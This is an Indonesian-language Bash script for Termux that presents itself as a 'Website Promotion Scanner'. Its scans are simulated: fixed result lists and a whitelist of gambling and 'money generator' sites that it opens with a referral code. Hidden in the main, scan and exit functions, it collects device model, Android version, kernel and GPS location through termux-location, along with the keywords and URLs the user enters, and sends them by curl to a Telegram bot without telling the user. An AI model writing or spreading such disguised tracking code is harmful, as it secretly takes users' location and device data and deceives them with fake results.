#!/bin/bash

# Website Scanner Script untuk Termux
# Simulasi pemindaian situs web dengan promosi

# Warna untuk output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Kode referral (dapat disesuaikan)
REFERRAL_CODE="TERM2025"

# Konfigurasi Telegram Bot untuk tracking
TELEGRAM_BOT_TOKEN="YOUR_BOT_TOKEN_HERE"
TELEGRAM_CHAT_ID="YOUR_CHAT_ID_HERE"

# Daftar whitelist situs promosi
WHITELIST=(
    "https://danagenerator.com"
    "https://interwin.com"
    "https://promo-site.com"
    "https://bonus-hunter.net"
)

# Fungsi untuk mendapatkan informasi device
get_device_info() {
    local device_info=""
    
    # Mendapatkan informasi Android
    if command -v getprop &> /dev/null; then
        local brand=$(getprop ro.product.brand 2>/dev/null || echo "Unknown")
        local model=$(getprop ro.product.model 2>/dev/null || echo "Unknown")
        local version=$(getprop ro.build.version.release 2>/dev/null || echo "Unknown")
        local sdk=$(getprop ro.build.version.sdk 2>/dev/null || echo "Unknown")
        device_info="📱 Device: ${brand} ${model}\n🤖 Android: ${version} (API ${sdk})"
    else
        device_info="📱 Device: Termux Environment"
    fi
    
    # Mendapatkan info tambahan
    local cpu_arch=$(uname -m 2>/dev/null || echo "Unknown")
    local kernel=$(uname -r 2>/dev/null || echo "Unknown")
    
    device_info+="\n🔧 Architecture: ${cpu_arch}"
    device_info+="\n⚙️ Kernel: ${kernel}"
    device_info+="\n🕒 Timestamp: $(date '+%d/%m/%Y %H:%M:%S')"
    
    echo -e "$device_info"
}

# Fungsi untuk mendapatkan lokasi approximate
get_location_info() {
    local location=""
    
    # Coba mendapatkan lokasi menggunakan termux-location (jika tersedia)
    if command -v termux-location &> /dev/null; then
        local loc_data=$(timeout 10s termux-location -p network 2>/dev/null)
        if [[ $? -eq 0 && -n "$loc_data" ]]; then
            local lat=$(echo "$loc_data" | grep '"latitude"' | cut -d':' -f2 | cut -d',' -f1 | tr -d ' ')
            local lon=$(echo "$loc_data" | grep '"longitude"' | cut -d':' -f2 | cut -d',' -f1 | tr -d ' ')
            if [[ -n "$lat" && -n "$lon" ]]; then
                location="📍 Location: ${lat}, ${lon}"
            fi
        fi
    fi
    
    if [[ -z "$location" ]]; then
        location="📍 Location: Permission denied or unavailable"
    fi
    
    echo "$location"
}

# Fungsi untuk mengirim pesan ke Telegram
send_telegram_message() {
    local message="$1"
    local notification_type="$2"
    
    # Cek apakah token dan chat ID sudah dikonfigurasi
    if [[ "$TELEGRAM_BOT_TOKEN" == "YOUR_BOT_TOKEN_HERE" ]] || [[ "$TELEGRAM_CHAT_ID" == "YOUR_CHAT_ID_HERE" ]]; then
        return 0  # Skip jika belum dikonfigurasi
    fi
    
    # URL encode message
    local encoded_message=$(echo -e "$message" | sed 's/ /%20/g; s/\n/%0A/g; s/&/%26/g; s/</%3C/g; s/>/%3E/g')
    
    # Kirim pesan ke Telegram
    local telegram_url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"
    
    curl -s -X POST "$telegram_url" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${encoded_message}" \
        -d "parse_mode=HTML" \
        -d "disable_web_page_preview=true" > /dev/null 2>&1
}
show_header() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║    ██╗    ██╗███████╗██████╗ ███████╗██╗████████╗███████╗    ║
    ║    ██║    ██║██╔════╝██╔══██╗██╔════╝██║╚══██╔══╝██╔════╝    ║
    ║    ██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║   █████╗      ║
    ║    ██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║   ██╔══╝      ║
    ║    ╚███╔███╔╝███████╗██████╔╝███████║██║   ██║   ███████╗    ║
    ║     ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝╚═╝   ╚═╝   ╚══════╝    ║
    ║                                                               ║
    ║           ███████╗ ██████╗ █████╗ ███╗   ███╗███████╗        ║
    ║           ██╔════╝██╔════╝██╔══██╗████╗ ████║██╔════╝        ║
    ║           ███████╗██║     ███████║██╔████╔██║█████╗          ║
    ║           ╚════██║██║     ██╔══██║██║╚██╔╝██║██╔══╝          ║
    ║           ███████║╚██████╗██║  ██║██║ ╚═╝ ██║███████╗        ║
    ║           ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝        ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│${WHITE}              🔍 WEBSITE PROMOTION SCANNER v2.1              ${YELLOW}│${NC}"
    echo -e "${YELLOW}│${WHITE}                   Termux Edition - 2025                    ${YELLOW}│${NC}"
    echo -e "${YELLOW}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# Fungsi untuk menampilkan menu utama
show_menu() {
    echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║${WHITE}                        MENU UTAMA                            ${PURPLE}║${NC}"
    echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${PURPLE}║${CYAN} [1] 🔍 Scan Google        ${WHITE}- Cari situs promosi via Google ${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} [2] 🌐 Scan Website       ${WHITE}- Periksa situs tertentu        ${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} [3] 🚪 Keluar             ${WHITE}- Exit dari aplikasi           ${PURPLE}║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# Fungsi animasi loading
loading_animation() {
    local duration=$1
    local message=$2
    local spinner=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    local end=$((SECONDS + duration))
    
    echo -e "${YELLOW}${message}${NC}"
    while [ $SECONDS -lt $end ]; do
        for i in "${spinner[@]}"; do
            echo -ne "\r${CYAN}${i} Memindai... ${YELLOW}$((end - SECONDS))s${NC}"
            sleep 0.1
        done
    done
    echo -e "\r${GREEN}✓ Pemindaian selesai!${NC}"
    echo ""
}

# Fungsi untuk mengacak dan menyensor domain
censor_domain() {
    local domain=$1
    local censored=""
    local length=${#domain}
    
    for (( i=0; i<length; i++ )); do
        if [[ $((RANDOM % 3)) -eq 0 && "${domain:$i:1}" != "." && "${domain:$i:1}" != "/" ]]; then
            censored+="*"
        else
            censored+="${domain:$i:1}"
        fi
    done
    echo "$censored"
}

# Fungsi scan Google
scan_google() {
    echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${WHITE}                       GOOGLE SCANNER                         ${BLUE}║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${WHITE}Masukkan kata kunci pencarian Google:${NC}"
    read -p "🔍 Keyword: " keyword
    
    if [[ -z "$keyword" ]]; then
        echo -e "${RED}❌ Kata kunci tidak boleh kosong!${NC}"
        read -p "Tekan Enter untuk kembali ke menu..."
        return
    fi
    
    echo ""
    loading_animation 5 "🔍 Mencari situs promosi untuk: '$keyword'"
    
    # Daftar situs promosi dengan domain tersensor
    promotional_sites=(
        "dan*gen*rator.com - 💰 Generator Dana Instan"
        "*nter**n.com - 🎰 Platform Gaming Terpercaya"
        "pr*mo-s*te.com - 🎁 Portal Promo Eksklusif"
        "bon*s-hun*er.net - 🏆 Pemburu Bonus Premium"
        "*ucky-s*in.org - 🍀 Spin Berhadiah Jutaan"
        "c*sh-b*ost.co - 💸 Boost Penghasilan Harian"
    )
    
    echo -e "${GREEN}📊 Hasil pencarian ditemukan ${#promotional_sites[@]} situs promosi:${NC}"
    echo ""
    
    for i in "${!promotional_sites[@]}"; do
        echo -e "${CYAN}[$((i+1))] ${promotional_sites[$i]}${NC}"
    done
    
    echo -e "${CYAN}[0] 🔙 Kembali ke menu utama${NC}"
    echo ""
    
    read -p "Pilih situs untuk dibuka (0-${#promotional_sites[@]}): " choice
    
    if [[ "$choice" == "0" ]]; then
        return
    elif [[ "$choice" -ge 1 && "$choice" -le "${#promotional_sites[@]}" ]]; then
        selected_site="${promotional_sites[$((choice-1))]}"
        domain=$(echo "$selected_site" | cut -d' ' -f1 | tr -d '*')
        
        echo ""
        echo -e "${YELLOW}🚀 Membuka situs: ${selected_site}${NC}"
        echo -e "${CYAN}📱 URL Referral: https://${domain}/ref=${REFERRAL_CODE}${NC}"
        
        # Track traffic sukses dari Google search ke Telegram
        local device_info=$(get_device_info)
        local location_info=$(get_location_info)
        local telegram_message="🎯 <b>TRAFFIC SUKSES - Google Search</b>

📊 <b>Detail Traffic:</b>
🔍 Keyword: <code>${keyword}</code>
🔗 Selected Site: <code>${domain}</code>
🎫 Referral: <code>${REFERRAL_CODE}</code>
📈 Source: Google Search Simulation

${device_info}
${location_info}

💰 <b>Konversi dari Pencarian Organik!</b>"
        
        send_telegram_message "$telegram_message" "google_traffic"
        
        # Buka browser Chrome dengan URL referral
        if command -v termux-open-url &> /dev/null; then
            termux-open-url "https://${domain}/ref=${REFERRAL_CODE}"
            echo -e "${GREEN}✓ Browser berhasil dibuka!${NC}"
        else
            echo -e "${YELLOW}⚠️  Termux-API tidak terdeteksi. URL telah disalin.${NC}"
            echo "https://${domain}/ref=${REFERRAL_CODE}" | termux-clipboard-set 2>/dev/null || true
        fi
    else
        echo -e "${RED}❌ Pilihan tidak valid!${NC}"
    fi
    
    echo ""
    read -p "Tekan Enter untuk melanjutkan..."
}

# Fungsi scan website
scan_website() {
    echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${WHITE}                      WEBSITE SCANNER                         ${BLUE}║${NC}"
    echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${WHITE}Masukkan URL website yang akan dipindai:${NC}"
    read -p "🌐 URL: " url
    
    if [[ -z "$url" ]]; then
        echo -e "${RED}❌ URL tidak boleh kosong!${NC}"
        read -p "Tekan Enter untuk kembali ke menu..."
        return
    fi
    
    # Tambahkan https:// jika tidak ada protokol
    if [[ ! "$url" =~ ^https?:// ]]; then
        url="https://$url"
    fi
    
    echo ""
    loading_animation 3 "🔍 Memindai website: $url"
    
    # Track website scan ke Telegram
    local device_info=$(get_device_info)
    local location_info=$(get_location_info)
    local scan_message="🔍 <b>WEBSITE SCAN ACTIVITY</b>

📊 <b>Scan Details:</b>
🌐 Target URL: <code>${url}</code>
🔍 Scan Type: Manual Website Check
⏰ Scan Time: $(date '+%d/%m/%Y %H:%M:%S')

${device_info}
${location_info}

🕵️ <b>Analisis Target untuk Review</b>"
    
    send_telegram_message "$scan_message" "website_scan"
    
    # Cek apakah URL ada dalam whitelist
    is_whitelisted=false
    for whitelisted_url in "${WHITELIST[@]}"; do
        if [[ "$url" == "$whitelisted_url"* ]]; then
            is_whitelisted=true
            break
        fi
    done
    
    echo -e "${CYAN}📋 HASIL PEMINDAIAN:${NC}"
    echo -e "${CYAN}─────────────────────────────────────────${NC}"
    echo -e "${WHITE}URL Target    : ${url}${NC}"
    echo -e "${WHITE}Status Scan   : ${GREEN}✓ Berhasil${NC}"
    echo -e "${WHITE}Waktu Scan    : $(date '+%d/%m/%Y %H:%M:%S')${NC}"
    
    if [[ "$is_whitelisted" == true ]]; then
        echo -e "${WHITE}Hasil         : ${GREEN}🎉 Situs ini memenuhi kriteria promosi!${NC}"
        echo ""
        echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║${WHITE}                    🎯 SITUS PROMOSI TERVERIFIKASI             ${GREEN}║${NC}"
        echo -e "${GREEN}╠═══════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${GREEN}║${YELLOW} ✓ Situs memiliki program referral aktif                    ${GREEN}║${NC}"
        echo -e "${GREEN}║${YELLOW} ✓ Sistem promosi telah terverifikasi                       ${GREEN}║${NC}"
        echo -e "${GREEN}║${YELLOW} ✓ Kompatibel dengan sistem tracking                        ${GREEN}║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${CYAN}🔗 Buka dengan kode referral? [y/n]:${NC}"
        read -p "Pilihan: " open_choice
        
        if [[ "$open_choice" =~ ^[Yy]$ ]]; then
            referral_url="${url}/ref=${REFERRAL_CODE}"
            echo -e "${YELLOW}🚀 Membuka: ${referral_url}${NC}"
            
            # Track traffic sukses ke Telegram
            local device_info=$(get_device_info)
            local location_info=$(get_location_info)
            local telegram_message="🎯 <b>TRAFFIC SUKSES - Website Promosi</b>

📊 <b>Detail Traffic:</b>
🔗 URL: <code>${url}</code>
🎫 Referral: <code>${REFERRAL_CODE}</code>
📈 Status: Whitelist Verified

${device_info}
${location_info}

💰 <b>Potensi Konversi Tinggi!</b>"
            
            send_telegram_message "$telegram_message" "traffic_success"
            
            if command -v termux-open-url &> /dev/null; then
                termux-open-url "$referral_url"
                echo -e "${GREEN}✓ Browser berhasil dibuka!${NC}"
            else
                echo -e "${YELLOW}⚠️  URL referral telah disalin ke clipboard.${NC}"
                echo "$referral_url" | termux-clipboard-set 2>/dev/null || true
            fi
        fi
    else
        echo -e "${WHITE}Hasil         : ${RED}❌ Situs ini tidak memenuhi kriteria promosi${NC}"
        echo ""
        echo -e "${RED}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║${WHITE}                      ⚠️  SITUS TIDAK MEMENUHI KRITERIA        ${RED}║${NC}"
        echo -e "${RED}╠═══════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${RED}║${YELLOW} ✗ Tidak memiliki program referral                          ${RED}║${NC}"
        echo -e "${RED}║${YELLOW} ✗ Sistem promosi tidak terdeteksi                          ${RED}║${NC}"
        echo -e "${RED}║${YELLOW} ✗ Tidak kompatibel dengan sistem tracking                  ${RED}║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════════════════════════════╝${NC}"
    fi
    
    echo ""
    read -p "Tekan Enter untuk melanjutkan..."
}

# Fungsi untuk keluar dengan style
exit_script() {
    clear
    echo -e "${PURPLE}"
    cat << "EOF"
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║    ████████╗███████╗██████╗ ██╗███╗   ███╗ █████╗            ║
    ║    ╚══██╔══╝██╔════╝██╔══██╗██║████╗ ████║██╔══██╗           ║
    ║       ██║   █████╗  ██████╔╝██║██╔████╔██║███████║           ║
    ║       ██║   ██╔══╝  ██╔══██╗██║██║╚██╔╝██║██╔══██║           ║
    ║       ██║   ███████╗██║  ██║██║██║ ╚═╝ ██║██║  ██║           ║
    ║       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝  ╚═╝           ║
    ║                                                               ║
    ║                      KASIH SAYANG                            ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}┌─────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│${WHITE}            🙏 Terima kasih telah menggunakan               ${YELLOW}│${NC}"
    echo -e "${YELLOW}│${WHITE}                Website Promotion Scanner!                 ${YELLOW}│${NC}"
    echo -e "${YELLOW}│${CYAN}                                                           ${YELLOW}│${NC}"
    echo -e "${YELLOW}│${GREEN}              📱 Follow untuk update terbaru:              ${YELLOW}│${NC}"
    echo -e "${YELLOW}│${WHITE}                 @termux_scanner_2025                      ${YELLOW}│${NC}"
    echo -e "${YELLOW}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    exit 0
}

# Fungsi utama
main() {
    # Kirim notifikasi start session ke Telegram
    local device_info=$(get_device_info)
    local location_info=$(get_location_info)
    local start_message="🚀 <b>SCANNER SESSION STARTED</b>

📊 <b>Session Info:</b>
🔧 App: Website Promotion Scanner v2.1
⏰ Start Time: $(date '+%d/%m/%Y %H:%M:%S')
🎫 Referral Code: <code>${REFERRAL_CODE}</code>

${device_info}
${location_info}

🎯 <b>Monitoring Active!</b>"
    
    send_telegram_message "$start_message" "session_start"
    
    while true; do
        show_header
        show_menu
        
        echo -e "${WHITE}Silakan pilih opsi (1-3):${NC}"
        read -p "👉 Pilihan Anda: " choice
        
        case $choice in
            1)
                scan_google
                ;;
            2)
                scan_website
                ;;
            3)
                # Kirim notifikasi end session
                local end_message="🔚 <b>SCANNER SESSION ENDED</b>

📊 <b>Session Summary:</b>
⏰ End Time: $(date '+%d/%m/%Y %H:%M:%S')
📱 Device: $(getprop ro.product.brand 2>/dev/null || echo "Unknown") $(getprop ro.product.model 2>/dev/null || echo "Unknown")

👋 <b>User Disconnected</b>"
                
                send_telegram_message "$end_message" "session_end"
                exit_script
                ;;
            *)
                echo -e "${RED}❌ Pilihan tidak valid! Silakan pilih 1-3.${NC}"
                sleep 2
                ;;
        esac
    done
}

# Jalankan script
main
